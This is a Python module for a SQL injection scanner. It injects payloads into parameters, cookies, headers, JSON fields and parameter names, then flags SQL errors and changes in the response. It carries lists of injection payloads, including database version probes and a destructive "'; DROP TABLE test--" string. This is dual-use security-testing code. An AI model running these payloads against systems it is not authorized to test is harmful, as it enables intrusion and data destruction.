"""
Comprehensive Input Vector Testing for SQL Injection

This module extends SQL injection testing to cover ALL potential input vectors:
- URL query parameters (GET)
- POST data (form fields, JSON, etc.)
- Cookies
- HTTP headers
- Parameter/header NAMES (not just values)

Features:
- Multi-stage stateful process handling
- Database-specific string concatenation payloads
- SQL wildcard detection
- JavaScript error detection
- Response anomaly detection
"""

import logging
import re
from typing import Dict, List, Optional, Any, Tuple
import requests
from difflib import SequenceMatcher

logger = logging.getLogger(__name__)


class ComprehensiveInputTester:
    """
    Comprehensive SQL injection testing across all input vectors.
    Tests both parameter/header names and values for injection vulnerabilities.
    """
    
    # String concatenation payloads for each database type
    STRING_CONCAT_PAYLOADS = {
        'oracle': [
            "'||'",  # Oracle concatenation operator
            "' || 'FOO",
            "' || database_name || '",
            "1'||'1'='11",
            "' || (SELECT banner FROM v$version WHERE rownum=1) || '",
        ],
        'mssql': [
            "'+'",  # MS-SQL concatenation operator
            "' + 'FOO",
            "' + @@version + '",
            "1'+'1'='11",
            "' + CAST(@@version AS VARCHAR) + '",
        ],
        'mysql': [
            "' '",  # MySQL space-based concatenation
            "' 'FOO",
            "' 'test' '",
            "1' '1'='1 1",
            "' @@version '",
        ],
        'postgresql': [
            "'||'",  # PostgreSQL uses same as Oracle
            "' || 'FOO",
            "' || version() || '",
            "1'||'1'='11",
        ],
    }
    
    # SQL wildcard payload for database interaction detection
    WILDCARD_PAYLOADS = [
        "%",
        "%%",
        "%'",
        "'%",
        "' AND column LIKE '%",
        "' OR column LIKE '%",
        "% AND 1=1--",
        "% OR 1=1--",
    ]
    
    # Additional string-based injection payloads
    STRING_BASED_PAYLOADS = [
        "'",  # Single quote
        "\"",  # Double quote
        "''",  # Double single quote (escaped quote)
        "\"\"",  # Double double quote
        "'--",
        "' #",
        "' /*",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' AND '1'='2",
        "' XOR '1'='1",
    ]
    
    # Common HTTP headers to test for SQL injection
    TESTABLE_HEADERS = [
        'User-Agent',
        'Referer',
        'X-Forwarded-For',
        'X-Real-IP',
        'X-Originating-IP',
        'X-Remote-IP',
        'X-Client-IP',
        'Accept-Language',
        'Accept-Encoding',
        'Accept',
        'Cookie',
        'Host',
        'Origin',
        'X-Requested-With',
        'X-Custom-Header',
    ]
    
    # JavaScript error patterns (indicating unescaped injection/XSS)
    JS_ERROR_PATTERNS = [
        r"SyntaxError",
        r"Uncaught",
        r"ReferenceError",
        r"TypeError",
        r"unexpected token",
        r"unterminated string",
        r"missing \) after argument list",
        r"illegal character",
        r"ParseError",
    ]
    
    def __init__(self, engine):
        """
        Initialize the comprehensive input tester.
        
        Args:
            engine: SQLInjectionEngine instance for making requests and checking errors
        """
        self.engine = engine
        self.baseline_responses = {}  # Cache baseline responses for anomaly detection
    
    def test_all_vectors(self, url: str, method: str,
                        params: Optional[Dict] = None,
                        data: Optional[Dict] = None,
                        cookies: Optional[Dict] = None,
                        headers: Optional[Dict] = None,
                        json_data: Optional[Dict] = None) -> List[Dict]:
        """
        Test all input vectors for SQL injection vulnerabilities.
        
        Args:
            url: Target URL
            method: HTTP method (GET, POST, etc.)
            params: URL query parameters
            data: POST form data
            cookies: HTTP cookies
            headers: HTTP headers
            json_data: JSON POST data
        
        Returns:
            List of vulnerability findings
        """
        findings = []
        
        # Get baseline response for anomaly detection
        baseline = self._get_baseline_response(url, method, params, data, cookies, headers)
        
        logger.info("Testing comprehensive input vectors for SQL injection")
        
        # Test query parameter values
        if params:
            findings.extend(self._test_parameter_values(
                url, method, params, data, cookies, headers, 'GET', baseline
            ))
            
            # Test query parameter names
            findings.extend(self._test_parameter_names(
                url, method, params, data, cookies, headers, 'GET', baseline
            ))
        
        # Test POST data values
        if data:
            findings.extend(self._test_parameter_values(
                url, method, params, data, cookies, headers, 'POST', baseline
            ))
            
            # Test POST parameter names
            findings.extend(self._test_parameter_names(
                url, method, params, data, cookies, headers, 'POST', baseline
            ))
        
        # Test JSON data (if provided)
        if json_data:
            findings.extend(self._test_json_data(
                url, method, params, cookies, headers, json_data, baseline
            ))
        
        # Test cookie values
        if cookies:
            findings.extend(self._test_cookies(
                url, method, params, data, cookies, headers, baseline
            ))
        
        # Test HTTP headers
        findings.extend(self._test_http_headers(
            url, method, params, data, cookies, headers, baseline
        ))
        
        logger.info(f"Comprehensive testing complete. Found {len(findings)} vulnerabilities.")
        return findings
    
    def _get_baseline_response(self, url: str, method: str,
                              params: Optional[Dict] = None,
                              data: Optional[Dict] = None,
                              cookies: Optional[Dict] = None,
                              headers: Optional[Dict] = None) -> Optional[requests.Response]:
        """Get baseline response for comparison."""
        cache_key = f"{method}:{url}"
        
        if cache_key in self.baseline_responses:
            return self.baseline_responses[cache_key]
        
        try:
            response = self.engine._make_request(url, method, params, data, cookies, headers)
            if response:
                self.baseline_responses[cache_key] = response
            return response
        except Exception as e:
            logger.warning(f"Failed to get baseline response: {e}")
            return None
    
    def _test_parameter_values(self, url: str, method: str,
                              params: Optional[Dict],
                              data: Optional[Dict],
                              cookies: Optional[Dict],
                              headers: Optional[Dict],
                              param_type: str,
                              baseline: Optional[requests.Response]) -> List[Dict]:
        """Test parameter values for SQL injection."""
        findings = []
        target_params = params if param_type == 'GET' else data
        
        if not target_params:
            return findings
        
        logger.info(f"Testing {param_type} parameter values")
        
        for param_name, param_value in target_params.items():
            # Test string concatenation payloads
            findings.extend(self._test_string_concatenation(
                url, method, params, data, cookies, headers,
                param_name, param_value, param_type, baseline
            ))
            
            # Test wildcard payloads
            findings.extend(self._test_wildcard_payloads(
                url, method, params, data, cookies, headers,
                param_name, param_value, param_type, baseline
            ))
            
            # Test basic string injection
            findings.extend(self._test_string_injection(
                url, method, params, data, cookies, headers,
                param_name, param_value, param_type, baseline
            ))
        
        return findings
    
    def _test_parameter_names(self, url: str, method: str,
                             params: Optional[Dict],
                             data: Optional[Dict],
                             cookies: Optional[Dict],
                             headers: Optional[Dict],
                             param_type: str,
                             baseline: Optional[requests.Response]) -> List[Dict]:
        """
        Test parameter NAMES for SQL injection (not just values).
        This tests if the application unsafely uses parameter names in SQL queries.
        """
        findings = []
        target_params = params if param_type == 'GET' else data
        
        if not target_params:
            return findings
        
        logger.info(f"Testing {param_type} parameter names for injection")
        
        # Test injecting in parameter names
        for param_name, param_value in list(target_params.items()):
            # Test with payloads appended to parameter name
            test_payloads = ["'", "' OR '1'='1", "'; DROP TABLE test--"]
            
            for payload in test_payloads:
                injected_name = f"{param_name}{payload}"
                
                if param_type == 'GET':
                    test_params = params.copy()
                    # Replace original param with injected name
                    del test_params[param_name]
                    test_params[injected_name] = param_value
                    response = self.engine._make_request(url, method, test_params, data, cookies, headers)
                else:
                    test_data = data.copy()
                    del test_data[param_name]
                    test_data[injected_name] = param_value
                    response = self.engine._make_request(url, method, params, test_data, cookies, headers)
                
                if response:
                    # Check for SQL errors
                    error_pattern = self.engine._check_sql_errors(response)
                    if error_pattern:
                        findings.append({
                            'injection_type': 'parameter_name_injection',
                            'vulnerable_parameter': param_name,
                            'parameter_type': param_type,
                            'injection_point': 'parameter_name',
                            'test_payload': injected_name,
                            'detection_evidence': f'SQL error in parameter name: {error_pattern}',
                            'database_type': self.engine._detect_database_type(response.text) or 'unknown',
                            'confidence_score': 0.9,
                            'response_data': {
                                'status_code': response.status_code,
                                'body_snippet': response.text[:500],
                            },
                        })
                        logger.info(f"Found SQL injection in parameter name: {param_name}")
                        break  # Move to next parameter
                    
                    # Check for anomalies
                    if self._detect_response_anomaly(response, baseline):
                        findings.append({
                            'injection_type': 'parameter_name_injection_anomaly',
                            'vulnerable_parameter': param_name,
                            'parameter_type': param_type,
                            'injection_point': 'parameter_name',
                            'test_payload': injected_name,
                            'detection_evidence': 'Response anomaly detected when injecting parameter name',
                            'confidence_score': 0.6,
                            'response_data': {
                                'status_code': response.status_code,
                                'body_snippet': response.text[:500],
                            },
                        })
                        logger.info(f"Anomaly detected in parameter name injection: {param_name}")
        
        return findings
    
    def _test_cookies(self, url: str, method: str,
                     params: Optional[Dict],
                     data: Optional[Dict],
                     cookies: Dict,
                     headers: Optional[Dict],
                     baseline: Optional[requests.Response]) -> List[Dict]:
        """Test cookie values for SQL injection."""
        findings = []
        
        logger.info("Testing cookie values for SQL injection")
        
        for cookie_name, cookie_value in cookies.items():
            param_findings = []
            
            # Test string-based payloads
            test_payloads = self.STRING_BASED_PAYLOADS[:5]  # Test first 5
            
            for payload in test_payloads:
                test_cookies = cookies.copy()
                test_cookies[cookie_name] = str(cookie_value) + payload
                
                response = self.engine._make_request(url, method, params, data, test_cookies, headers)
                
                if response:
                    # Check for SQL errors
                    error_pattern = self.engine._check_sql_errors(response)
                    if error_pattern:
                        param_findings.append({
                            'injection_type': 'cookie_injection',
                            'vulnerable_parameter': cookie_name,
                            'parameter_type': 'COOKIE',
                            'test_payload': payload,
                            'detection_evidence': f'SQL error in cookie: {error_pattern}',
                            'database_type': self.engine._detect_database_type(response.text) or 'unknown',
                            'response': response,
                        })
                        
                        if len(param_findings) >= 2:
                            break
                    
                    # Check for JavaScript errors
                    js_error = self._detect_js_errors(response)
                    if js_error:
                        param_findings.append({
                            'injection_type': 'cookie_injection_js_error',
                            'vulnerable_parameter': cookie_name,
                            'parameter_type': 'COOKIE',
                            'test_payload': payload,
                            'detection_evidence': f'JavaScript error: {js_error}',
                            'response': response,
                        })
            
            # Add confirmed findings
            if param_findings:
                finding = param_findings[0]
                finding['confidence_score'] = 0.8 if len(param_findings) >= 2 else 0.6
                finding.pop('response', None)
                findings.append(finding)
                logger.info(f"Found SQL injection in cookie: {cookie_name}")
        
        return findings
    
    def _test_http_headers(self, url: str, method: str,
                          params: Optional[Dict],
                          data: Optional[Dict],
                          cookies: Optional[Dict],
                          headers: Optional[Dict],
                          baseline: Optional[requests.Response]) -> List[Dict]:
        """Test HTTP headers for SQL injection."""
        findings = []
        
        logger.info("Testing HTTP headers for SQL injection")
        
        # Prepare base headers
        base_headers = headers.copy() if headers else {}
        
        for header_name in self.TESTABLE_HEADERS:
            # Skip if this header shouldn't be tested (e.g., Host can break requests)
            if header_name == 'Host':
                continue
            
            param_findings = []
            original_value = base_headers.get(header_name, 'test')
            
            # Test with SQL injection payloads
            test_payloads = ["'", "' OR '1'='1", "' AND '1'='2"]
            
            for payload in test_payloads:
                test_headers = base_headers.copy()
                test_headers[header_name] = str(original_value) + payload
                
                response = self.engine._make_request(url, method, params, data, cookies, test_headers)
                
                if response:
                    # Check for SQL errors
                    error_pattern = self.engine._check_sql_errors(response)
                    if error_pattern:
                        param_findings.append({
                            'injection_type': 'header_injection',
                            'vulnerable_parameter': header_name,
                            'parameter_type': 'HEADER',
                            'test_payload': payload,
                            'detection_evidence': f'SQL error in header: {error_pattern}',
                            'database_type': self.engine._detect_database_type(response.text) or 'unknown',
                            'response': response,
                        })
                        
                        if len(param_findings) >= 2:
                            break
            
            # Test header NAME injection
            if header_name.startswith('X-'):  # Only test custom headers
                test_headers = base_headers.copy()
                injected_header_name = f"{header_name}' OR '1'='1"
                test_headers[injected_header_name] = original_value
                
                response = self.engine._make_request(url, method, params, data, cookies, test_headers)
                
                if response:
                    error_pattern = self.engine._check_sql_errors(response)
                    if error_pattern:
                        param_findings.append({
                            'injection_type': 'header_name_injection',
                            'vulnerable_parameter': header_name,
                            'parameter_type': 'HEADER',
                            'injection_point': 'header_name',
                            'test_payload': injected_header_name,
                            'detection_evidence': f'SQL error in header name: {error_pattern}',
                            'database_type': self.engine._detect_database_type(response.text) or 'unknown',
                            'response': response,
                        })
            
            # Add confirmed findings
            if param_findings:
                finding = param_findings[0]
                finding['confidence_score'] = 0.85 if len(param_findings) >= 2 else 0.65
                finding.pop('response', None)
                findings.append(finding)
                logger.info(f"Found SQL injection in header: {header_name}")
        
        return findings
    
    def _test_string_concatenation(self, url: str, method: str,
                                  params: Optional[Dict],
                                  data: Optional[Dict],
                                  cookies: Optional[Dict],
                                  headers: Optional[Dict],
                                  param_name: str,
                                  param_value: Any,
                                  param_type: str,
                                  baseline: Optional[requests.Response]) -> List[Dict]:
        """Test database-specific string concatenation payloads."""
        findings = []
        
        # Test each database type's concatenation syntax
        for db_type, payloads in self.STRING_CONCAT_PAYLOADS.items():
            for payload in payloads[:2]:  # Test first 2 for each DB
                if param_type == 'GET':
                    test_params = params.copy()
                    test_params[param_name] = str(param_value) + payload
                    response = self.engine._make_request(url, method, test_params, data, cookies, headers)
                else:
                    test_data = data.copy()
                    test_data[param_name] = str(param_value) + payload
                    response = self.engine._make_request(url, method, params, test_data, cookies, headers)
                
                if response:
                    # Check for SQL errors
                    error_pattern = self.engine._check_sql_errors(response)
                    if error_pattern:
                        findings.append({
                            'injection_type': 'string_concatenation',
                            'vulnerable_parameter': param_name,
                            'parameter_type': param_type,
                            'test_payload': payload,
                            'detection_evidence': f'SQL error with {db_type} concatenation: {error_pattern}',
                            'database_type': db_type,
                            'confidence_score': 0.85,
                            'response_data': {
                                'status_code': response.status_code,
                                'body_snippet': response.text[:500],
                            },
                        })
                        logger.info(f"Found {db_type} string concatenation vulnerability in {param_name}")
                        return findings  # Found it, no need to test other DB types
        
        return findings
    
    def _test_wildcard_payloads(self, url: str, method: str,
                               params: Optional[Dict],
                               data: Optional[Dict],
                               cookies: Optional[Dict],
                               headers: Optional[Dict],
                               param_name: str,
                               param_value: Any,
                               param_type: str,
                               baseline: Optional[requests.Response]) -> List[Dict]:
        """Test SQL wildcard payloads for database interaction detection."""
        findings = []
        
        for payload in self.WILDCARD_PAYLOADS[:3]:  # Test first 3
            if param_type == 'GET':
                test_params = params.copy()
                test_params[param_name] = payload
                response = self.engine._make_request(url, method, test_params, data, cookies, headers)
            else:
                test_data = data.copy()
                test_data[param_name] = payload
                response = self.engine._make_request(url, method, params, test_data, cookies, headers)
            
            if response:
                # Check for SQL errors
                error_pattern = self.engine._check_sql_errors(response)
                if error_pattern:
                    findings.append({
                        'injection_type': 'wildcard_injection',
                        'vulnerable_parameter': param_name,
                        'parameter_type': param_type,
                        'test_payload': payload,
                        'detection_evidence': f'SQL error with wildcard: {error_pattern}',
                        'database_type': self.engine._detect_database_type(response.text) or 'unknown',
                        'confidence_score': 0.75,
                        'response_data': {
                            'status_code': response.status_code,
                            'body_snippet': response.text[:500],
                        },
                    })
                    logger.info(f"Found wildcard SQL injection in {param_name}")
                    break
                
                # Check for response anomalies (wildcard may cause different behavior)
                if baseline and self._detect_response_anomaly(response, baseline):
                    findings.append({
                        'injection_type': 'wildcard_injection_anomaly',
                        'vulnerable_parameter': param_name,
                        'parameter_type': param_type,
                        'test_payload': payload,
                        'detection_evidence': 'Response anomaly with SQL wildcard',
                        'confidence_score': 0.5,
                        'response_data': {
                            'status_code': response.status_code,
                            'body_snippet': response.text[:500],
                        },
                    })
        
        return findings
    
    def _test_string_injection(self, url: str, method: str,
                              params: Optional[Dict],
                              data: Optional[Dict],
                              cookies: Optional[Dict],
                              headers: Optional[Dict],
                              param_name: str,
                              param_value: Any,
                              param_type: str,
                              baseline: Optional[requests.Response]) -> List[Dict]:
        """Test basic string-based injection payloads."""
        findings = []
        
        for payload in self.STRING_BASED_PAYLOADS[:3]:  # Test first 3
            if param_type == 'GET':
                test_params = params.copy()
                test_params[param_name] = str(param_value) + payload
                response = self.engine._make_request(url, method, test_params, data, cookies, headers)
            else:
                test_data = data.copy()
                test_data[param_name] = str(param_value) + payload
                response = self.engine._make_request(url, method, params, test_data, cookies, headers)
            
            if response:
                # Check for JavaScript errors (indicating reflected input)
                js_error = self._detect_js_errors(response)
                if js_error:
                    findings.append({
                        'injection_type': 'string_injection_js_error',
                        'vulnerable_parameter': param_name,
                        'parameter_type': param_type,
                        'test_payload': payload,
                        'detection_evidence': f'JavaScript error (possible XSS vector): {js_error}',
                        'confidence_score': 0.7,
                        'response_data': {
                            'status_code': response.status_code,
                            'body_snippet': response.text[:500],
                        },
                    })
                    logger.info(f"JavaScript error detected in {param_name} (possible reflected input)")
                    break
        
        return findings
    
    def _test_json_data(self, url: str, method: str,
                       params: Optional[Dict],
                       cookies: Optional[Dict],
                       headers: Optional[Dict],
                       json_data: Dict,
                       baseline: Optional[requests.Response]) -> List[Dict]:
        """Test JSON data fields for SQL injection."""
        findings = []
        
        logger.info("Testing JSON data fields for SQL injection")
        
        # Recursively test all JSON fields
        def test_json_field(data_dict: Dict, path: str = ""):
            for key, value in data_dict.items():
                current_path = f"{path}.{key}" if path else key
                
                if isinstance(value, dict):
                    test_json_field(value, current_path)
                elif isinstance(value, (str, int, float)):
                    # Test this field
                    for payload in ["'", "' OR '1'='1"]:
                        test_json = json_data.copy()
                        # Navigate to the field and inject
                        if '.' not in current_path:
                            test_json[key] = str(value) + payload
                        
                        # Make request with JSON data
                        test_headers = headers.copy() if headers else {}
                        test_headers['Content-Type'] = 'application/json'
                        
                        try:
                            response = self.engine.session.post(
                                url,
                                json=test_json,
                                headers=test_headers,
                                cookies=cookies,
                                timeout=30,
                                verify=self.engine.config.get('verify_ssl', False)
                            )
                            
                            if response:
                                error_pattern = self.engine._check_sql_errors(response)
                                if error_pattern:
                                    findings.append({
                                        'injection_type': 'json_injection',
                                        'vulnerable_parameter': current_path,
                                        'parameter_type': 'JSON',
                                        'test_payload': payload,
                                        'detection_evidence': f'SQL error in JSON field: {error_pattern}',
                                        'database_type': self.engine._detect_database_type(response.text) or 'unknown',
                                        'confidence_score': 0.8,
                                    })
                                    logger.info(f"Found SQL injection in JSON field: {current_path}")
                                    break
                        except Exception as e:
                            logger.debug(f"Error testing JSON field {current_path}: {e}")
        
        test_json_field(json_data)
        return findings
    
    def _detect_js_errors(self, response: requests.Response) -> Optional[str]:
        """Detect JavaScript errors in response (indicating unescaped injection)."""
        for pattern in self.JS_ERROR_PATTERNS:
            match = re.search(pattern, response.text, re.IGNORECASE)
            if match:
                return match.group(0)
        return None
    
    def _detect_response_anomaly(self, response: requests.Response,
                                baseline: Optional[requests.Response]) -> bool:
        """
        Detect anomalies in response compared to baseline.
        Looks for differences in:
        - Status code
        - Content length
        - Response structure
        """
        if not baseline:
            return False
        
        # Check status code difference
        if response.status_code != baseline.status_code:
            logger.debug(f"Status code anomaly: {baseline.status_code} -> {response.status_code}")
            return True
        
        # Check significant content length difference (>20%)
        baseline_len = len(baseline.text)
        response_len = len(response.text)
        
        if baseline_len > 0:
            diff_ratio = abs(response_len - baseline_len) / baseline_len
            if diff_ratio > 0.2:  # More than 20% difference
                logger.debug(f"Content length anomaly: {baseline_len} -> {response_len} ({diff_ratio:.1%})")
                return True
        
        # Check content similarity
        similarity = SequenceMatcher(None, baseline.text[:1000], response.text[:1000]).ratio()
        if similarity < 0.8:  # Less than 80% similar
            logger.debug(f"Content similarity anomaly: {similarity:.1%}")
            return True
        
        return False
